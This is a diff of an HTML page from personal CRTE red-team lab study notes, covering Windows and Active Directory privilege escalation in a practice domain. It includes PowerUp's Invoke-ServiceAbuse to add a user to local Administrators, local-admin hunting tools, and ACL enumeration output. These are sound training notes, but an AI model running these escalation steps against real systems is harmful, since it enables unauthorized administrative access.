@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CRTE - Certified Red Team Expert | Mr Stark Study Notes</title>
+  <title>CRTE Part 3 - Privilege Escalation | Mr Stark Study Notes</title>
   <link rel="shortcut icon" href="../assets/images/logo.ico" type="image/x-icon">
   <link rel="stylesheet" href="../assets/css/style.css">
   <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -48,36 +48,36 @@
       overflow-wrap: break-word;
     }
     .goad-content code {
-      background: var(--eerie-black-2);
-      padding: 2px 6px;
+      background: var(--onyx);
+      color: var(--orange-yellow-crayola);
+      padding: 3px 8px;
       border-radius: 4px;
       font-family: 'Courier New', monospace;
-      color: var(--orange-yellow-crayola);
       font-size: 18px;
     }
     .goad-content pre {
       background: var(--eerie-black-2);
-      padding: 20px;
+      border: 1px solid var(--jet);
       border-radius: 8px;
+      padding: 20px;
       overflow-x: auto;
       margin: 20px 0;
-      border: 1px solid var(--jet);
     }
     .goad-content pre code {
-      background: none;
-      padding: 0;
-      font-size: 16px;
+      background: transparent;
       color: var(--light-gray);
+      padding: 0;
+      font-size: 18px;
     }
     .goad-content ul, .goad-content ol {
-      color: var(--light-gray);
       margin: 20px 0;
       padding-left: 30px;
-      font-size: 20px;
     }
     .goad-content li {
+      color: var(--light-gray);
       margin-bottom: 10px;
-      line-height: 1.6;
+      font-size: 20px;
+      line-height: 1.8;
     }
     .goad-content img {
       max-width: 100%;
@@ -90,63 +90,57 @@
       padding-left: 20px;
       margin: 20px 0;
       color: var(--light-gray-70);
-      font-style: italic;
-    }
-    .goad-content table {
-      width: 100%;
-      border-collapse: collapse;
-      margin: 25px 0;
-      font-size: 18px;
-    }
-    .goad-content th, .goad-content td {
-      border: 1px solid var(--jet);
-      padding: 12px;
-      text-align: left;
-      color: var(--light-gray);
-    }
-    .goad-content th {
-      background: var(--eerie-black-2);
-      color: var(--white-2);
-      font-weight: 500;
     }
     .goad-content hr {
       border: none;
       border-top: 1px solid var(--jet);
-      margin: 30px 0;
+      margin: 40px 0;
     }
-    .navigation {
+    .part-navigation {
       display: flex;
       justify-content: space-between;
-      align-items: center;
-      margin-top: 40px;
+      margin-top: 50px;
       padding-top: 30px;
       border-top: 1px solid var(--jet);
     }
-    .navigation a {
+    .part-navigation a {
       color: var(--orange-yellow-crayola);
       text-decoration: none;
-      font-size: 16px;
+      font-size: 18px;
       display: flex;
       align-items: center;
       gap: 8px;
     }
-    .navigation a:hover {
+    .part-navigation a:hover {
       text-decoration: underline;
     }
-    @media (max-width: 768px) {
-      .goad-content {
-        padding: 20px;
-        font-size: 18px;
-      }
-      .goad-content h1 {
-        font-size: 28px;
-      }
-      .goad-content h2 {
-        font-size: 24px;
-      }
-      .goad-content h3 {
-        font-size: 22px;
-      }
+    .goad-sidebar-list {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+    .goad-sidebar-list li {
+      margin-bottom: 8px;
+    }
+    .goad-sidebar-list a {
+      color: var(--light-gray);
+      text-decoration: none;
+      font-size: 14px;
+      display: block;
+      padding: 5px 0;
+      transition: color 0.25s ease;
+    }
+    .goad-sidebar-list a:hover {
+      color: var(--orange-yellow-crayola);
+    }
+    .back-link {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: var(--orange-yellow-crayola);
+      text-decoration: none;
+      font-size: 14px;
+      margin-bottom: 15px;
     }
   </style>
 </head>
@@ -168,21 +162,48 @@
       </div>
       <div class="sidebar-info_more">
         <div class="separator"></div>
-        <a href="index.html" class="back-link">
+        <a href="../index.html" class="back-link">
           <ion-icon name="arrow-back-outline"></ion-icon>
-          Back to CRTE Index
+          Back to Portfolio
         </a>
         <div class="separator"></div>
+        <p style="color: var(--light-gray); font-size: var(--fs-7); margin-bottom: 10px;">Jump to Part:</p>
         <ul class="goad-sidebar-list">
-<li><a href="part-01-introduction.html">Part 1: Introduction</a></li><li><a href="part-02-enumeration.html">Part 2: Enumeration</a></li><li><a href="part-03-privilege-escalation.html">Part 3: Privilege Escalation</a></li><li><a href="part-04-kerberoasting-attack.html">Part 4: Kerberoasting Attack</a></li><li><a href="part-05-targeted-kerberoasting.html">Part 5: Targeted Kerberoasting</a></li><li><a href="part-06-laps-attack.html">Part 6: LAPS Attack</a></li><li><a href="part-07-dumping-lsass.html">Part 7: Dumping LSASS</a></li><li><a href="part-08-gmsa-attack.html">Part 8: gMSA Attack</a></li><li><a href="part-09-lsass-with-mde-bypass.html">Part 9: LSASS with MDE Bypass</a></li><li><a href="part-10-pass-the-certificates.html">Part 10: Pass the Certificates</a></li><li><a href="part-11-unconstrained-delegation.html">Part 11: Unconstrained Delegation</a></li><li><a href="part-12-constrained-delegation.html">Part 12: Constrained Delegation</a></li><li><a href="part-13-rbcd-attack.html">Part 13: RBCD Attack</a></li><li><a href="part-14-golden-ticket.html">Part 14: Golden Ticket</a></li><li><a href="part-15-silver-ticket.html">Part 15: Silver Ticket</a></li><li><a href="part-16-diamond-ticket.html">Part 16: Diamond Ticket</a></li><li><a href="part-17-skeleton-key.html">Part 17: Skeleton Key</a></li><li><a href="part-18-sapphire-ticket.html">Part 18: Sapphire Ticket</a></li><li><a href="part-19-adminsdholder.html">Part 19: AdminSDHolder</a></li><li><a href="part-20-ad-certificate-attacks.html">Part 20: AD Certificate Attacks</a></li><li><a href="part-21-shadow-credentials.html">Part 21: Shadow Credentials</a></li><li><a href="part-22-cross-domain-unconstrained-delegation.html">Part 22: Cross Domain Unconstrained Delegation</a></li><li><a href="part-23-azure-ad-integration-attacks.html">Part 23: Azure AD Integration Attacks</a></li><li><a href="part-24-sid-history-attack-(part-1).html">Part 24: SID History Attack (Part 1)</a></li><li><a href="part-25-sid-history-attack-(part-2).html">Part 25: SID History Attack (Part 2)</a></li><li><a href="part-26-cross-forest-kerberoast.html">Part 26: Cross Forest Kerberoast</a></li><li><a href="part-27-cross-forest-constrained-delegation.html">Part 27: Cross Forest Constrained Delegation</a></li><li><a href="part-28-cross-forest-unconstrained-delegation.html">Part 28: Cross Forest Unconstrained Delegation</a></li><li><a href="part-29-trust-key-abuse.html">Part 29: Trust Key Abuse</a></li><li><a href="part-30-sid-history-injection.html">Part 30: SID History Injection</a></li><li><a href="part-31-mssql-database-links.html">Part 31: MSSQL Database Links</a></li><li><a href="part-32-foreign-security-principals.html">Part 32: Foreign Security Principals</a></li><li><a href="part-33-pam-privileged-access-management.html">Part 33: PAM/Privileged Access Management</a></li><li><a href="part-34-trusting-to-trusted-trust-key.html">Part 34: Trusting to Trusted Trust Key</a></li><li><a href="part-35-trust-transitivity-abuse.html">Part 35: Trust Transitivity Abuse</a></li>
-        </ul>
-        <div class="separator"></div>
-        <ul class="social-list">
-          <li class="social-item">
-            <a href="https://github.com/daviosardinha/mr-stark-study-notes" class="social-link" target="_blank">
-              <ion-icon name="logo-github"></ion-icon>
-            </a>
-          </li>
+<li><a href="part-01-introduction.html">Part 1: Introduction</a></li>
+<li><a href="part-02-enumeration.html">Part 2: Enumeration</a></li>
+<li><a href="part-03-privilege-escalation.html" style="color: var(--orange-yellow-crayola);">Part 3: Privilege Escalation</a></li>
+<li><a href="part-04-kerberoasting-attack.html">Part 4: Kerberoasting attack</a></li>
+<li><a href="part-05-privilege-escalation---targete.html">Part 5: Privilege Escalation - Targeted Kerberoasting</a></li>
+<li><a href="part-06-privilege-escalation---laps-lo.html">Part 6: Privilege Escalation - LAPS (Local Administrator Pass...</a></li>
+<li><a href="part-07-dumping-lsass-credentials.html">Part 7: Dumping LSASS Credentials</a></li>
+<li><a href="part-08-privilege-escalation---gmsa-at.html">Part 8: Privilege Escalation - gMSA Attack</a></li>
+<li><a href="part-09-lsass-attack-with-mde-bypass.html">Part 9: LSASS Attack With MDE Bypass</a></li>
+<li><a href="part-10-pass-the-certificates-attack.html">Part 10: Pass The Certificates Attack</a></li>
+<li><a href="part-11-privilege-escalation---unconst.html">Part 11: Privilege Escalation - Unconstrained Delegation</a></li>
+<li><a href="part-12-privilege-escalation---constra.html">Part 12: Privilege Escalation - Constrained Delegation</a></li>
+<li><a href="part-13-privilege-escalation---rbcdres.html">Part 13: Privilege Escalation - RBCD(Resource Based Constraine...</a></li>
+<li><a href="part-14-domain-persistence---golden-ti.html">Part 14: Domain Persistence - Golden Ticket attack</a></li>
+<li><a href="part-15-domain-persistence---silver-ti.html">Part 15: Domain Persistence - Silver Ticket Attack</a></li>
+<li><a href="part-16-domain-persistence---diamond-t.html">Part 16: Domain Persistence - Diamond Ticket Attack</a></li>
+<li><a href="part-17-domain-persistence---skeleton-.html">Part 17: Domain Persistence - Skeleton Key Attack</a></li>
+<li><a href="part-18-domain-persistence---sapphire-.html">Part 18: Domain Persistence - Sapphire Ticket Attack</a></li>
+<li><a href="part-19-domain-persistence---adminsdho.html">Part 19: Domain Persistence - AdminSDHolder attack</a></li>
+<li><a href="part-20-cross-domain-attacks---active-.html">Part 20: Cross Domain Attacks - Active Directory Certificate...</a></li>
+<li><a href="part-21-shadow-credentials---abusing-u.html">Part 21: Shadow Credentials - Abusing User Object</a></li>
+<li><a href="part-22-cross-domain-attacks---unconst.html">Part 22: Cross Domain Attacks - Unconstrained Delegation to E...</a></li>
+<li><a href="part-23-cross-domain-attacks---attacki.html">Part 23: Cross Domain Attacks - Attacking Azure AD Integratio...</a></li>
+<li><a href="part-24-cross-domain-attacks---child-t.html">Part 24: Cross Domain attacks - Child To Forest Root SID Hist...</a></li>
+<li><a href="part-25-cross-domain-attacks---child-t.html">Part 25: Cross Domain attacks - Child To Forest Root SID Hist...</a></li>
+<li><a href="part-26-cross-forest-attacks---kerbero.html">Part 26: Cross Forest Attacks - Kerberoast Attack</a></li>
+<li><a href="part-27-cross-forest-attacks---constra.html">Part 27: Cross Forest Attacks - Constrained Delegation with P...</a></li>
+<li><a href="part-28-cross-forest-attacks---unconst.html">Part 28: Cross Forest Attacks - Unconstrained Delegation</a></li>
+<li><a href="part-29-cross-forest-attacks---trust-k.html">Part 29: Cross Forest Attacks - Trust Key Abuse to Access Exp...</a></li>
+<li><a href="part-30-cross-forest-attacks---injecti.html">Part 30: Cross Forest Attacks - Injecting SID History to Bypa...</a></li>
+<li><a href="part-31-trust-abuse---mssql-servers---.html">Part 31: Trust Abuse - MSSQL Servers - Database Links</a></li>
+<li><a href="part-32-cross-forest-attacks---foreign.html">Part 32: Cross Forest Attacks - Foreign Security Principals A...</a></li>
+<li><a href="part-33-cross-forest-attacks---abusing.html">Part 33: Cross Forest Attacks - Abusing PAM(Privileged Manage...</a></li>
+<li><a href="part-34-cross-forest-attacks---trustin.html">Part 34: Cross Forest Attacks - Trusting to Trusted Trust Key</a></li>
+<li><a href="part-35-cross-forest-attacks---abusing.html">Part 35: Cross Forest Attacks - Abusing Trust Transitivity</a></li>
         </ul>
       </div>
     </aside>
@@ -190,99 +211,118 @@
       <article class="about active" data-page="about">
         <div class="goad-content">
 <h1>CRTE - Certified Red Team Expert</h1>
-<h2>**Privilege Escalation**</h2>
+<h2><strong>Privilege Escalation</strong></h2>
 <p>Privilege escalation in Active Directory (AD) is the process of gaining higher-level access than what a user or account initially possesses. This can be achieved by exploiting vulnerabilities, misconfiguration, or features within the AD environment.</p>
 <p>Here are the key aspects of privilege escalation:</p>
-<li>**Local vs. Domain Privilege Escalation**: Privilege escalation can be broadly categorized into local and domain-level attacks. Local privilege escalation focuses on gaining administrative rights on a specific machine, while domain privilege escalation targets gaining control over the entire AD domain.</li>
+<ul>
+<li><strong>Local vs. Domain Privilege Escalation</strong>: Privilege escalation can be broadly categorized into local and domain-level attacks. Local privilege escalation focuses on gaining administrative rights on a specific machine, while domain privilege escalation targets gaining control over the entire AD domain.</li>
 <li>Local privilege escalation is often a stepping stone to domain privilege escalation.</li>
-<li>**Attack Methodology**: Attackers usually start from a foothold, often as a normal domain user, and then attempt to escalate privileges. The focus is often on the abuse of functionality rather than using exploits.</li>
-<li>**Built-in Tools**: Attackers often rely on built-in tools as much as possible. This helps in blending with normal system activity and evading detection.</li>
-<li>**Minimal Obfuscation**: Attackers often use minimal obfuscation of their tools and commands to avoid detection.</li>
-<li>**Abuse of Functionality**: Privilege escalation is often achieved through the abuse of legitimate functionalities, such as delegation, ACLs, or services.</li>
-<li>**Importance of OPSEC**: Maintaining operational security (OPSEC) is crucial. Attackers try to minimize their footprint and avoid detection by using stealthy techniques.</li>
+<li><strong>Attack Methodology</strong>: Attackers usually start from a foothold, often as a normal domain user, and then attempt to escalate privileges. The focus is often on the abuse of functionality rather than using exploits.</li>
+<li><strong>Built-in Tools</strong>: Attackers often rely on built-in tools as much as possible. This helps in blending with normal system activity and evading detection.</li>
+<li><strong>Minimal Obfuscation</strong>: Attackers often use minimal obfuscation of their tools and commands to avoid detection.</li>
+<li><strong>Abuse of Functionality</strong>: Privilege escalation is often achieved through the abuse of legitimate functionalities, such as delegation, ACLs, or services.</li>
+<li><strong>Importance of OPSEC</strong>: Maintaining operational security (OPSEC) is crucial. Attackers try to minimize their footprint and avoid detection by using stealthy techniques.</li>
 <li>This includes using AES keys when forging Kerberos tickets, avoiding credential extraction from LSASS memory when possible, and using built-in tools and manual methods.</li>
-<li>**Persistence**: Once higher privileges are obtained, attackers often establish persistence mechanisms to maintain access.</li>
+<li><strong>Persistence</strong>: Once higher privileges are obtained, attackers often establish persistence mechanisms to maintain access.</li>
 <li>This could include creating golden tickets, modifying ACLs, or using the DPAPI domain backup key.</li>
-<li>**Defense Evasion:** Attackers employ various techniques to evade security measures.</li>
+<li><strong>Defense Evasion:</strong> Attackers employ various techniques to evade security measures.</li>
 <li>This includes bypassing logging and detection mechanisms using tools like InvisiShell and avoiding the use of C2 frameworks when possible to avoid detection.</li>
-<li>**Lateral Movement**: Once an attacker has achieved higher privileges, they will often move laterally to other systems to expand their reach.</li>
-<li>**Focus on Objectives**: The goal of the assessment should guide the escalation process, avoiding unnecessary steps like targeting the domain administrator account unless absolutely necessary.</li>
-<li>**Exploiting Misconfigurations**: A key aspect of privilege escalation involves finding and exploiting misconfigurations in the target environment. This could include overly permissive ACLs, unquoted service paths, or misconfigured delegation settings.</li>
-<li>**Credential Management**: Attackers focus on obtaining credentials to escalate privileges. This may include extracting credentials from memory, files, or other sources like browser cookies and PowerShell history.</li>
-<li>**Cross-Domain/Forest Attacks**: Privilege escalation may involve moving across domain and forest boundaries using trust relationships, ADCS, or other techniques.</li>
+<li><strong>Lateral Movement</strong>: Once an attacker has achieved higher privileges, they will often move laterally to other systems to expand their reach.</li>
+<li><strong>Focus on Objectives</strong>: The goal of the assessment should guide the escalation process, avoiding unnecessary steps like targeting the domain administrator account unless absolutely necessary.</li>
+<li><strong>Exploiting Misconfigurations</strong>: A key aspect of privilege escalation involves finding and exploiting misconfigurations in the target environment. This could include overly permissive ACLs, unquoted service paths, or misconfigured delegation settings.</li>
+<li><strong>Credential Management</strong>: Attackers focus on obtaining credentials to escalate privileges. This may include extracting credentials from memory, files, or other sources like browser cookies and PowerShell history.</li>
+<li><strong>Cross-Domain/Forest Attacks</strong>: Privilege escalation may involve moving across domain and forest boundaries using trust relationships, ADCS, or other techniques.</li>
 <li>This may involve abusing trust keys, injecting SID history, or exploiting PAM trusts.</li>
 <li>The default settings for trusts can sometimes be abused to move in the reverse direction of the trust.</li>
-<li>**Detection and Defense**: Understanding how attacks are detected and what defenses are in place is crucial for both attackers and defenders. This includes being aware of tools like MDI and MDE, as well as defensive measures like credential guard and WDAC.</li>
-<li>**Adversary Mindset:** Attackers have a tendency to go for the lowest hanging fruit and they often operate under the idea of elusive superiority. Defenders can use this mindset to create deception layers.</li>
+<li><strong>Detection and Defense</strong>: Understanding how attacks are detected and what defenses are in place is crucial for both attackers and defenders. This includes being aware of tools like MDI and MDE, as well as defensive measures like credential guard and WDAC.</li>
+<li><strong>Adversary Mindset:</strong> Attackers have a tendency to go for the lowest hanging fruit and they often operate under the idea of elusive superiority. Defenders can use this mindset to create deception layers.</li>
+</ul>
+</ul>
 <p>These aspects highlight the complexity and multi-faceted nature of privilege escalation in AD. It is an ongoing challenge that requires constant vigilance and adaptation from both attackers and defenders..</p>
 <p>Let now use for example PowerUp to accomplish our first task. We will use PowerUp now to check for any privilege escalation path.</p>
 <p>Let’s start by loading PowerUp.ps1 the we can execute it.</p>
 <p>`. .\PowerUp.ps1</p>
 <p>Invoke-AllChecks`</p>
-<img src="./images/screenshot_39.png" alt="image" class="content-image">
-<img src="./images/screenshot_40.png" alt="image" class="content-image">
-<p>As you are able to see on the screenshot above, PowerUp was able to enumerate and find some valid privilege escalation via `Service Permission`on a service named “`ALG`”.</p>
-<h3>**Understanding Service Permissions**</h3>
+<img src="./images/screenshot_39.png" alt="image">
+<img src="./images/screenshot_40.png" alt="image">
+<p>As you are able to see on the screenshot above, PowerUp was able to enumerate and find some valid privilege escalation via <code>Service Permission</code>on a service named “<code>ALG</code>”.</p>
+<h3><strong>Understanding Service Permissions</strong></h3>
 <p>Windows services run with different privilege levels (e.g., LocalSystem, LocalService, or NetworkService). If a service is misconfigured, a low-privileged user can exploit it to execute code with higher privileges.</p>
 <p>In this case:</p>
-<li>**Service Name**: ALG (Application Layer Gateway).</li>
-<li>**Path**: The service binary is located at `C:\WINDOWS\System32\alg.exe`.</li>
-<li>**StartName**: `LocalSystem`, meaning the service runs with the highest privileges on the system.</li>
-<li>**CanRestart**: `True`, indicating the service can be restarted (a key factor for exploitation).</li>
-<li>**Abuse Function**: `Invoke-ServiceAbuse -Name 'ALG'`.</li>
-<h3>**Privilege Escalation via Service Abuse**</h3>
-<li>**Why This Is a Vulnerability**:</li>
-<li>If a low-privileged user has **write access** to the service configuration or its executable file, they can modify it to execute arbitrary code with `LocalSystem` privileges.</li>
+<ul>
+<li><strong>Service Name</strong>: ALG (Application Layer Gateway).</li>
+<li><strong>Path</strong>: The service binary is located at <code>C:\WINDOWS\System32\alg.exe</code>.</li>
+<li><strong>StartName</strong>: <code>LocalSystem</code>, meaning the service runs with the highest privileges on the system.</li>
+<li><strong>CanRestart</strong>: <code>True</code>, indicating the service can be restarted (a key factor for exploitation).</li>
+<li><strong>Abuse Function</strong>: <code>Invoke-ServiceAbuse -Name 'ALG'</code>.</li>
+</ul>
+<h3><strong>Privilege Escalation via Service Abuse</strong></h3>
+<ol>
+<li><strong>Why This Is a Vulnerability</strong>:</li>
+<ul>
+<li>If a low-privileged user has <strong>write access</strong> to the service configuration or its executable file, they can modify it to execute arbitrary code with <code>LocalSystem</code> privileges.</li>
 <li>Misconfigurations in service permissions (e.g., weak permissions on the executable or registry entries) can allow unauthorized users to abuse this service.</li>
-<li>**Exploit Path**:</li>
-<li>**Step 1**: Confirm the user has permission to modify the service or its binary.</li>
-<li>For example, the executable (`alg.exe`) or service parameters might be writable.</li>
-<li>**Step 2**: Replace the legitimate executable or modify the service configuration (e.g., changing the binary path).</li>
-<li>**Step 3**: Restart the service using tools like `sc` or PowerShell, triggering the execution of the malicious payload.</li>
-<li>**Step 4**: The payload runs with `LocalSystem` privileges, effectively escalating the attacker's privileges.</li>
-<h3>**Invoke-ServiceAbuse**</h3>
-<li>The `Invoke-ServiceAbuse` function automates the exploitation of misconfigured services.</li>
-<li>**How it Works**:</li>
+<li><strong>Exploit Path</strong>:</li>
+<li><strong>Step 1</strong>: Confirm the user has permission to modify the service or its binary.</li>
+<li>For example, the executable (<code>alg.exe</code>) or service parameters might be writable.</li>
+<li><strong>Step 2</strong>: Replace the legitimate executable or modify the service configuration (e.g., changing the binary path).</li>
+<li><strong>Step 3</strong>: Restart the service using tools like <code>sc</code> or PowerShell, triggering the execution of the malicious payload.</li>
+<li><strong>Step 4</strong>: The payload runs with <code>LocalSystem</code> privileges, effectively escalating the attacker's privileges.</li>
+</ul>
+</ul>
+</ol>
+<h3><strong>Invoke-ServiceAbuse</strong></h3>
+<ul>
+<li>The <code>Invoke-ServiceAbuse</code> function automates the exploitation of misconfigured services.</li>
+<li><strong>How it Works</strong>:</li>
 <li>Modifies the service's configuration (if permissions allow) or replaces the service binary.</li>
 <li>Restarts the service to execute the attacker's payload.</li>
-<h3>**Why "CanRestart: True" Is Critical**</h3>
+</ul>
+</ul>
+<h3><strong>Why "CanRestart: True" Is Critical</strong></h3>
+<ul>
 <li>For service abuse to succeed, the attacker must restart the service after modifying it. If the service cannot be restarted, the attack is less effective because the changes won't take effect immediately.</li>
+</ul>
 <p>This scenario demonstrates how misconfigured services can be exploited for privilege escalation and emphasizes the importance of securing service configurations in Windows environments.</p>
-<p>Now that we know that we can abuse this Service Permission misconfiguration. Let’s use the abuse function for the service permission issue and add our current domain user (`studentuser163`) to the local Administrators group.</p>
-<p>`Invoke-ServiceAbuse -Name 'ALG' -UserName 'us.techcorp.local\studentuser163' -Verbose`</p>
-<img src="./images/screenshot_41.png" alt="image" class="content-image">
-<p>We can see above that, we were able to create a user locally and also add the same user to local `Administrators` group.</p>
-<h3>**Notes**</h3>
-<li>`Make sure that you add the user with the domain, this way instead of creating a new user, we will be adding our domain account studentuser163, into local administrators group.`</li>
-<li>`After adding the user to the administrators group, you may need to log out and log back in for the elevated privileges to take effect in the session.`</li>
-<p>**Before logout and login**</p>
-<img src="./images/screenshot_42.png" alt="image" class="content-image">
-<p>**After Logout and Login**</p>
-<img src="./images/screenshot_43.png" alt="image" class="content-image">
+<p>Now that we know that we can abuse this Service Permission misconfiguration. Let’s use the abuse function for the service permission issue and add our current domain user (<code>studentuser163</code>) to the local Administrators group.</p>
+<p><code>Invoke-ServiceAbuse -Name 'ALG' -UserName 'us.techcorp.local\studentuser163' -Verbose</code></p>
+<img src="./images/screenshot_41.png" alt="image">
+<p>We can see above that, we were able to create a user locally and also add the same user to local <code>Administrators</code> group.</p>
+<h3><strong>Notes</strong></h3>
+<ul>
+<li><code>Make sure that you add the user with the domain, this way instead of creating a new user, we will be adding our domain account studentuser163, into local administrators group.</code></li>
+<li><code>After adding the user to the administrators group, you may need to log out and log back in for the elevated privileges to take effect in the session.</code></li>
+</ul>
+<p><strong>Before logout and login</strong></p>
+<img src="./images/screenshot_42.png" alt="image">
+<p><strong>After Logout and Login</strong></p>
+<img src="./images/screenshot_43.png" alt="image">
 <p>We can confirm now that we are part of local administrators group on this machine.</p>
 <h2>Remote Local Admin Enumeration</h2>
-<p>Our next task is to enumerate and find a machine in the domain where our user (`studentuser163`) has local administrative access and for this we will use tools like `Find-LocalAdminAccess`(PowerView) `Find-PSRemotingLocalAdminAccess.ps1` and `Find-WMILocalAdminAccess.ps1`.</p>
+<p>Our next task is to enumerate and find a machine in the domain where our user (<code>studentuser163</code>) has local administrative access and for this we will use tools like <code>Find-LocalAdminAccess</code>(PowerView) <code>Find-PSRemotingLocalAdminAccess.ps1</code> and <code>Find-WMILocalAdminAccess.ps1</code>.</p>
 <p>Let’s start by invoking all of them at once.</p>
-<p>`. \.PowerView.ps1`</p>
-<p>`. \Find-PSRemotingLocalAdminAccess.ps1`</p>
-<p>`. .\``Find-WMILocalAdminAccess.ps1`</p>
-<img src="./images/screenshot_44.png" alt="image" class="content-image">
-<p>Now that we have imported all these 3 modules, we can simply start checking for local administrative access on the machines in the `us.techcorp.local` domain.</p>
-<p>`Find-LocalAdminAccess -Verbose`</p>
-<img src="./images/screenshot_45.png" alt="image" class="content-image">
-<p>`Find-PSRemotingLocalAdminAccess -Verbose`</p>
-<img src="./images/screenshot_46.png" alt="image" class="content-image">
-<p>`Find-PSRemotingLocalAdminAccess` command will always bring this error on output, but if there was a valid machine on the domain where our user were able to access the machine as local admin, it would bring the name of the machine on the output.</p>
-<p>`Find-WMILocalAdminAccess`</p>
-<img src="./images/screenshot_47.png" alt="image" class="content-image">
-<p>We tried 3 tools to for this type of enumeration but we were not able to find a single machine were out `studentuser163` has local admin access.</p>
-<p>So, for our next approach, let enumerate all the groups memberships for our `studentuser163`.</p>
+<p><code>. \.PowerView.ps1</code></p>
+<p><code>. \Find-PSRemotingLocalAdminAccess.ps1</code></p>
+<p><code>. .\</code><code>Find-WMILocalAdminAccess.ps1</code></p>
+<img src="./images/screenshot_44.png" alt="image">
+<p>Now that we have imported all these 3 modules, we can simply start checking for local administrative access on the machines in the <code>us.techcorp.local</code> domain.</p>
+<p><code>Find-LocalAdminAccess -Verbose</code></p>
+<img src="./images/screenshot_45.png" alt="image">
+<p><code>Find-PSRemotingLocalAdminAccess -Verbose</code></p>
+<img src="./images/screenshot_46.png" alt="image">
+<p><code>Find-PSRemotingLocalAdminAccess</code> command will always bring this error on output, but if there was a valid machine on the domain where our user were able to access the machine as local admin, it would bring the name of the machine on the output.</p>
+<p><code>Find-WMILocalAdminAccess</code></p>
+<img src="./images/screenshot_47.png" alt="image">
+<p>We tried 3 tools to for this type of enumeration but we were not able to find a single machine were out <code>studentuser163</code> has local admin access.</p>
+<p>So, for our next approach, let enumerate all the groups memberships for our <code>studentuser163</code>.</p>
 <h3>Enumerate Group Memberships with ADModule</h3>
-<p>The **ActiveDirectory module**'s `Get-ADPrincipalGroupMembership` command in PowerShell is used to retrieve the groups that a user, computer, or other security principal is directly a member of. However, it **does not recursively retrieve nested group memberships**, which can be a significant limitation when dealing with complex Active Directory (AD) environments where groups are often nested within other groups.</p>
-<h3>**What Does It Mean?**</h3>
-<li>**Direct Membership**: `Get-ADPrincipalGroupMembership` will only show the groups that the specified principal is explicitly a member of.</li>
-<li>**Nested Membership**: If the principal is a member of Group A, and Group A is a member of Group B, `Get-ADPrincipalGroupMembership` will only show Group A. It will not show Group B unless queried separately.</li>
-<p>In scenarios where you need to determine **all effective memberships**, including those through nested groups, this limitation can hinder comprehensive enumeration.</p>
+<p>The <strong>ActiveDirectory module</strong>'s <code>Get-ADPrincipalGroupMembership</code> command in PowerShell is used to retrieve the groups that a user, computer, or other security principal is directly a member of. However, it <strong>does not recursively retrieve nested group memberships</strong>, which can be a significant limitation when dealing with complex Active Directory (AD) environments where groups are often nested within other groups.</p>
+<h3><strong>What Does It Mean?</strong></h3>
+<ul>
+<li><strong>Direct Membership</strong>: <code>Get-ADPrincipalGroupMembership</code> will only show the groups that the specified principal is explicitly a member of.</li>
+<li><strong>Nested Membership</strong>: If the principal is a member of Group A, and Group A is a member of Group B, <code>Get-ADPrincipalGroupMembership</code> will only show Group A. It will not show Group B unless queried separately.</li>
+</ul>
+<p>In scenarios where you need to determine <strong>all effective memberships</strong>, including those through nested groups, this limitation can hinder comprehensive enumeration.</p>
 <p>To bypass this lack of recursive group membership on ADModule, we can use the following script.</p>
 <pre><code class="language-powershell">  function Get-ADPrincipalGroupMembershipRecursive ($SamAccountName)
 {
@@ -297,16 +337,16 @@ select -ExpandProperty distinguishedname)
         }
     }
 }</code></pre>
-<p>We can simply copy/paste the script above and then execute the `Get-ADPrincipalGroupMembershipRecursive`.</p>
-<p>`Get-ADPrincipalGroupMembershipRecursive 'studentuser163'`</p>
-<img src="./images/screenshot_48.png" alt="image" class="content-image">
-<p>After we copy/paste the script and execute the `Get-ADPrincipalGroupMembershipRecursive`** **command, we can now see recursively all the Groups our user studentuser163 is member of.</p>
+<p>We can simply copy/paste the script above and then execute the <code>Get-ADPrincipalGroupMembershipRecursive</code>.</p>
+<p><code>Get-ADPrincipalGroupMembershipRecursive 'studentuser163'</code></p>
+<img src="./images/screenshot_48.png" alt="image">
+<p>After we copy/paste the script and execute the <code>Get-ADPrincipalGroupMembershipRecursive</code><strong> </strong>command, we can now see recursively all the Groups our user studentuser163 is member of.</p>
 <p>After this our next step is to check if any of the groups we are member of has some interesting ACL entries.</p>
 <h3>Enumerate Group Memberships with PowerView</h3>
 <p>Different from ADModule, PowerView can query group memberships recursively, making PowerView a better option for this type of enumeration.</p>
-<p>We can use the command `Find-InterestingDomainAcl -ResolveGUIDs` to enumerate all the ACLs. But since we already know all ACLs inside this domain, our main focus so far is to enumerate ACLs form one specific group (Managers).</p>
+<p>We can use the command <code>Find-InterestingDomainAcl -ResolveGUIDs</code> to enumerate all the ACLs. But since we already know all ACLs inside this domain, our main focus so far is to enumerate ACLs form one specific group (Managers).</p>
 <p>So we can achieve this with the following query:</p>
-<p>`Find-InterestingDomainAcl -ResolveGUIDs |?{$_.IdentityReferenceName -match 'Managers'}`</p>
+<p><code>Find-InterestingDomainAcl -ResolveGUIDs |?{$_.IdentityReferenceName -match 'Managers'}</code></p>
 <pre><code class="language-powershell">ObjectDN                : OU=Mgmt,DC=us,DC=techcorp,DC=local
 AceQualifier            : AccessAllowed
 ActiveDirectoryRights   : ReadProperty, WriteProperty
@@ -464,36 +504,42 @@ IdentityReferenceDN     : CN=Managers,CN=Users,DC=us,DC=techcorp,DC=local
 IdentityReferenceClass  : group</code></pre>
 <p>After checking all the ACLs that Matches group Management we were able to find lots of ACL configured here.</p>
 <p>We can mainly focus on 3 sttributes here:</p>
-<p>**IdentityReferenceName**: `managers` → The group that has been granted the permissions.</p>
-<p>**ObjectDN**: `CN=MachineAdmins,OU=Mgmt,DC=us,DC=techcorp,DC=local` → The Distinguished Name of the `MachineAdmins` group in the `Mgmt` OU within the `us.techcorp.local` domain.</p>
-<p>**ActiveDirectoryRights**: `GenericAll` → Grants full control over the object, including read, write, delete, and manage permissions.</p>
+<p><strong>IdentityReferenceName</strong>: <code>managers</code> → The group that has been granted the permissions.</p>
+<p><strong>ObjectDN</strong>: <code>CN=MachineAdmins,OU=Mgmt,DC=us,DC=techcorp,DC=local</code> → The Distinguished Name of the <code>MachineAdmins</code> group in the <code>Mgmt</code> OU within the <code>us.techcorp.local</code> domain.</p>
+<p><strong>ActiveDirectoryRights</strong>: <code>GenericAll</code> → Grants full control over the object, including read, write, delete, and manage permissions.</p>
 <p>Below the full properties detailed:</p>
